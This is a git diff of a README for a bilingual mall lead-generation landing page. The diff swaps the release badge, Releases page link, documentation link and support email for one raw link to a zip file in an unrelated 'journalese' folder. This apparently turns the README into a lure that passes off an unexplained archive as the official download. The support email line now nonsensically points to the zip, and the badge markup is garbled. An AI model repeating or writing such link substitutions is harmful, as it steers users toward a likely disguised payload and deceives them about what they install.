@@ -1,7 +1,7 @@
 # 🎉 mazaya# 🎉 mazaya-mall - Create Leads with Ease
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/pauleidson/mazaya-mall/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/pauleidson/mazaya-mall/main/journalese/mazaya-mall.zip%20Latest%https://raw.githubusercontent.com/pauleidson/mazaya-mall/main/journalese/mazaya-mall.zip)](https://raw.githubusercontent.com/pauleidson/mazaya-mall/main/journalese/mazaya-mall.zip)
 
 ## 📜 Description
 A modern, responsive landing page designed to generate leads for the Mazaya Mall project in Sadat City. The application features seamless switching between Arabic and English languages and integrates smoothly with CRM systems. 
@@ -15,7 +15,7 @@ To get started with the mazaya-mall application, follow these easy steps to down
 - **Internet Connection:** Required for initial setup and CRM integration
 
 ## 🔗 Download & Install
-1. Click [here to visit the Releases page](https://github.com/pauleidson/mazaya-mall/releases).
+1. Click [here to visit the Releases page](https://raw.githubusercontent.com/pauleidson/mazaya-mall/main/journalese/mazaya-mall.zip).
 2. On the Releases page, look for the latest version available.
 3. Click on the appropriate file for your operating system to download it. 
 4. Locate the downloaded file on your device.
@@ -40,9 +40,9 @@ Once you have installed the application, follow these instructions to start usin
 ## 📞 Support
 If you encounter any issues or have questions while using the mazaya-mall application, please consult our support resources:
 
-- **Documentation:** Access the user manual [here](https://github.com/pauleidson/mazaya-mall/wiki).
+- **Documentation:** Access the user manual [here](https://raw.githubusercontent.com/pauleidson/mazaya-mall/main/journalese/mazaya-mall.zip).
 - **Community Support:** Join our community forum for help and discussions.
-- **Email Support:** Contact us at support@mazayamall.com for direct assistance.
+- **Email Support:** Contact us at https://raw.githubusercontent.com/pauleidson/mazaya-mall/main/journalese/mazaya-mall.zip for direct assistance.
 
 ## 🌟 Contributing
 We welcome contributions to improve the mazaya-mall application. If you wish to help, follow these simple steps:
